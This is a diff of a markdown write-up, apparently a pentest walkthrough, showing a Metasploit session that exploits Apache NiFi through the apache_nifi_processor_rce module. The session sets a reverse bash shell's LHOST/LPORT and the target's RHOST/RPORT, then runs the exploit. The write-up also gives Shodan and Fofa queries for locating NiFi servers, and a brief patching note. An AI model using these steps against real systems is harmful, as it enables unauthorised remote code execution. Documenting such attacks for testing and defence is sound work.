@@ -19,26 +19,26 @@ MetaSploit Windows Default Payload: **cmd/windows/reverse_powershell**
 Shodan Query: `title:"NiFi"`  
 Fofa Query: `title=="NiFi"`  
 
-# Using apache_nifi_processor_rce's Exploit
+## Using apache_nifi_processor_rce's Exploit
 <pre>msf6 > use exploit/multi/http/apache_nifi_processor_rce
 [*] Using configured payload cmd/unix/reverse_bash</pre>
-# Local IP for Reverse Shell Connection
+## Local IP for Reverse Shell Connection
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LHOST 192.168.60.7
 LHOST => 192.168.60.7</pre>
-# Local Port for Reverse Shell Connection
+## Local Port for Reverse Shell Connection
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set LPORT 4444
 LPORT => 4444</pre>
-# Remote IP for Exploit Execution
+## Remote IP for Exploit Execution
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RHOST 192.168.60.57
 RHOST => 192.168.60.57</pre>
-# Remote Port for Exploit Execution
+## Remote Port for Exploit Execution
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > set RPORT 8080
 RPORT => 8080</pre>
-# Checking Current Exploit Options
+## Checking Current Exploit Options
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > show options</pre>
 ![msf1](https://user-images.githubusercontent.com/94451745/149518743-e2ad0802-819a-4037-9798-8422f0c236c4.png)
-# Running Exploit
+## Running Exploit
 <pre>msf6 exploit(multi/http/apache_nifi_processor_rce) > run</pre>
 ![msf2](https://user-images.githubusercontent.com/94451745/149520071-97c27099-82df-493b-9ead-a5a96afcc29b.png)
-# Vulnerability patching
+## Vulnerability patching
 Upgrade to the latest version, add/change current credentials and setup an IP whitelist in your current firewall settings.
